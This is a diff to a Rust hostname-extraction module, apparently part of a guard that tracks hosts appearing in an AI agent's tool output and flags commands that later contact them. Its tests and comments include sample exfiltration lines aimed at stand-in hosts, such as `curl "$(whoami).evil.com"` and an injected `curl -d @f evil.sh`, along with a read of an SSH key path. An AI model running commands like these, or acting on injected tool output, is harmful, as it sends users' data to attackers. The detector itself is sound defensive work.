@@ -1,8 +1,9 @@
 //! Find hostnames in free text.
 //!
 //! Both sides of the check use this function: the tool output that taints a
-//! host, and the command that uses it. Because both sides use the same rules,
-//! a host that is missed is missed on both sides.
+//! host, and the command that uses it. The output side is stricter, because
+//! tool output is full of code such as `user.name` and `await.is`, and those
+//! end in real gTLDs.
 
 use std::collections::HashSet;
 use std::sync::LazyLock;
@@ -16,17 +17,26 @@ static TLDS: LazyLock<HashSet<String>> = LazyLock::new(|| {
         .collect()
 });
 
-/// Real TLDs that are also common file extensions. A bare `README.md` is a
-/// file. `https://x.md` and `x.md/path` are still hosts.
-// ponytail: a bare `curl -d @f evil.sh` with no scheme or path is missed.
-// Check whether the token exists as a file in cwd if this shows up.
+/// In tool output, a bare token counts only with one of these TLDs. A token
+/// with a scheme, `@`, a path or a port counts with any TLD.
+// ponytail: an injected bare `curl evil.blue` is missed. Grow this list from
+// real injections, not from guesses.
+const COMMON_TLDS: &[&str] = &[
+    "biz", "cloud", "cn", "co", "com", "de", "dev", "info", "io", "link", "me", "net", "online",
+    "org", "ru", "site", "top", "uk", "xyz",
+];
+
+/// Real TLDs that are also common file extensions. With these, only a scheme
+/// or `user@` makes a host, because `lib.rs:12` and awk's `/x\/a.md/` are files.
+// ponytail: an injected `curl -d @f evil.sh` with no scheme is missed.
 const FILE_TLDS: &[&str] = &[
     "ac", "am", "app", "cc", "cr", "in", "java", "map", "md", "mk", "ml", "mm", "mov", "new", "pl",
     "pm", "pro", "ps", "pub", "py", "rs", "sh", "so", "sv", "tf", "zip", "zone",
 ];
 
 /// Returns every hostname in `text`, in lowercase, in order of appearance.
-pub fn hosts(text: &str) -> Vec<String> {
+/// Set `output` when `text` is tool output.
+pub fn hosts(text: &str, output: bool) -> Vec<String> {
     let b = text.as_bytes();
     let mut out = Vec::new();
     let mut i = 0;
@@ -48,16 +58,19 @@ pub fn hosts(text: &str) -> Vec<String> {
         }
         let (before, run, after) = (&text[..s], text[s..e].to_ascii_lowercase(), &b[e..]);
 
-        // A scheme, a `user@`, a path, a query or a port marks a host. A bare
-        // token has less evidence, so file extensions win there.
-        let strong = before.ends_with("://")
-            || before.ends_with('@')
+        // A scheme or `user@` is proof of a host. A path, query or port after
+        // the token is good evidence. A bare token has the least.
+        let url = before.ends_with("://") || before.ends_with('@');
+        let strong = url
             || matches!(after.first(), Some(b'/' | b'?'))
             || (after.first() == Some(&b':') && after.get(1).is_some_and(u8::is_ascii_digit));
         if !strong && before.ends_with('/') {
             continue; // path component such as `src/main.rs`
         }
-        if is_ipv4(&run) || is_domain(&run, strong) {
+        if !strong && matches!(after.first(), Some(b'(' | b'_')) {
+            continue; // method call such as `socket.next()` or `e.to_string`
+        }
+        if is_ipv4(&run) || is_domain(&run, url, strong, output) {
             out.push(run);
         }
     }
@@ -68,7 +81,7 @@ fn is_host_byte(c: u8) -> bool {
     c.is_ascii_alphanumeric() || c == b'.' || c == b'-'
 }
 
-fn is_domain(s: &str, strong: bool) -> bool {
+fn is_domain(s: &str, url: bool, strong: bool, output: bool) -> bool {
     let labels: Vec<&str> = s.split('.').collect();
     let tld = labels[labels.len() - 1];
     labels.len() >= 2
@@ -76,7 +89,8 @@ fn is_domain(s: &str, strong: bool) -> bool {
             .iter()
             .all(|l| !l.is_empty() && l.len() <= 63 && !l.starts_with('-') && !l.ends_with('-'))
         && TLDS.contains(tld)
-        && (strong || !FILE_TLDS.contains(&tld))
+        && (url || !FILE_TLDS.contains(&tld))
+        && (strong || !output || COMMON_TLDS.contains(&tld))
 }
 
 /// Loopback and `0.0.0.0` are not counted. Data sent there stays on the machine.
@@ -102,20 +116,27 @@ mod tests {
             ("curl \"$(whoami).evil.com\"", &["evil.com"]),
             ("git clone git@github.com:org/repo.git", &["github.com"]),
             (
-                "see http://x.sh and x.md/path and api.rs:8080",
-                &["x.sh", "x.md", "api.rs"],
+                "see http://x.sh, a@x.md, x.md/path, lib.rs:12, /a\\/b.md/",
+                &["x.sh", "x.md"],
             ),
             ("ping 10.0.0.7; ping 127.0.0.1; ping 0.0.0.0", &["10.0.0.7"]),
             ("cat README.md src/main.rs ~/.ssh/id_rsa.pub", &[]),
             (
-                "python -m http.server; v1.2.3; self.store()",
-                &["self.store"],
+                "python -m http.server; v1.2.3; socket.next(); e.to_string",
+                &[],
             ),
+            ("git config user.name", &["user.name"]),
             ("go to localhost:3000", &[]),
             ("ends with a dot: evil.com.", &["evil.com"]),
         ];
         for (text, want) in cases {
-            assert_eq!(hosts(text), *want, "input: {text}");
+            assert_eq!(hosts(text, false), *want, "input: {text}");
         }
+    }
+
+    #[test]
+    fn output_side_needs_evidence_for_rare_tlds() {
+        let text = "user.name await.is evil.com https://evil.blue x.name/p";
+        assert_eq!(hosts(text, true), ["evil.com", "evil.blue", "x.name"]);
     }
 }
